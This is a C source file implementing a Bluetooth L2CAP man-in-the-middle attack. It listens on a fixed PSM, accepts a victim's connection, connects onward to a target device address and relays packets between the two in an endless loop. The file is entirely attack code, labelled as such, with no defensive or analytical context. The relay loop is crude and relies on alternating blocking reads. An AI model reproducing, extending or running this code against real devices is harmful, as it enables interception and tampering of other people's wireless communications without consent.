#include "mitm.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <sys/socket.h>

void start_mitm_attack(const bdaddr_t *target_addr) {
    int listen_sock, client_sock, forward_sock;
    struct sockaddr_l2 addr = { 0 }, client_addr = { 0 };
    socklen_t opt = sizeof(client_addr);
    char buffer[1024];
    listen_sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (listen_sock < 0) {
        perror("MITM socket creation failed");
        return;
    }
    addr.l2_family = AF_BLUETOOTH;
    bacpy(&addr.l2_bdaddr, BDADDR_ANY);
    addr.l2_psm = htobs(0x1001);
    if (bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Binding MITM socket failed");
        close(listen_sock);
        return;
    }
    listen(listen_sock, 1);
    printf("MITM Listening for connections...\n");
    client_sock = accept(listen_sock, (struct sockaddr *)&client_addr, &opt);
    if (client_sock < 0) {
        perror("Failed to accept connection");
        close(listen_sock);
        return;
    }
    forward_sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (forward_sock < 0) {
        perror("Forwarding socket creation failed");
        close(client_sock);
        close(listen_sock);
        return;
    }

    struct sockaddr_l2 target_addr_struct = { 0 };
    target_addr_struct.l2_family = AF_BLUETOOTH;
    target_addr_struct.l2_psm = htobs(0x1001);
    bacpy(&target_addr_struct.l2_bdaddr, target_addr);

    if (connect(forward_sock, (struct sockaddr *)&target_addr_struct, sizeof(target_addr_struct)) < 0) {
        perror("Failed to connect to target device");
        close(client_sock);
        close(forward_sock);
        close(listen_sock);
        return;
    }

    printf("MITM attack started! Relaying packets...\n");

    while (1) {
        ssize_t received = read(client_sock, buffer, sizeof(buffer));
        if (received > 0) {
            write(forward_sock, buffer, received);
        }

        received = read(forward_sock, buffer, sizeof(buffer));
        if (received > 0) {
            write(client_sock, buffer, received);
        }
    }
    close(client_sock);
    close(forward_sock);
    close(listen_sock);
}
